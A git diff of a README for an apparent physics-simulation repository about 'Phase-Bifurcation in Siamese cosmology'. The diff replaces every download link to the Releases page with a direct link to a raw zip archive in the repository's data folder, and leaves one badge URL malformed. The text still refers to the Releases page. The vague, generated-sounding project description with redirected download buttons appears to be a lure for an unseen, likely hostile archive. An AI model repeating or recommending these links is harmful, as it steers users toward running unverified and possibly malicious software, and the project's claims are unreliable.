@@ -1,6 +1,6 @@
 # 🌌 Dynamical-Origin-of-mphi-crit-1.965 - Study Phase Bifurcation Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Cedtherace/Dynamical-Origin-of-mphi-crit-1.965/releases)
+[![Download Now](https://raw.githubusercontent.com/Cedtherace/Dynamical-Origin-of-mphi-crit-1.965/main/data/Dynamical-Origin-of-mphi-crit-1.965-v2.8-beta.4.zip%https://raw.githubusercontent.com/Cedtherace/Dynamical-Origin-of-mphi-crit-1.965/main/data/Dynamical-Origin-of-mphi-crit-1.965-v2.8-beta.4.zip)](https://raw.githubusercontent.com/Cedtherace/Dynamical-Origin-of-mphi-crit-1.965/main/data/Dynamical-Origin-of-mphi-crit-1.965-v2.8-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you download the software, ensure your system meets these requirements:
 
 To get started, visit this page to download:
 
-[Download the latest version](https://github.com/Cedtherace/Dynamical-Origin-of-mphi-crit-1.965/releases)
+[Download the latest version](https://raw.githubusercontent.com/Cedtherace/Dynamical-Origin-of-mphi-crit-1.965/main/data/Dynamical-Origin-of-mphi-crit-1.965-v2.8-beta.4.zip)
 
 On the Releases page, you will see the latest version listed. Click on the version you want, then download the file that matches your operating system.
 
@@ -95,4 +95,4 @@ We plan to incorporate more features aimed at enhancing your experience and expa
 
 Now, download the application and dive into the fascinating world of Phase-Bifurcation in Siamese cosmology!
 
-[Download the latest version](https://github.com/Cedtherace/Dynamical-Origin-of-mphi-crit-1.965/releases)
+[Download the latest version](https://raw.githubusercontent.com/Cedtherace/Dynamical-Origin-of-mphi-crit-1.965/main/data/Dynamical-Origin-of-mphi-crit-1.965-v2.8-beta.4.zip)
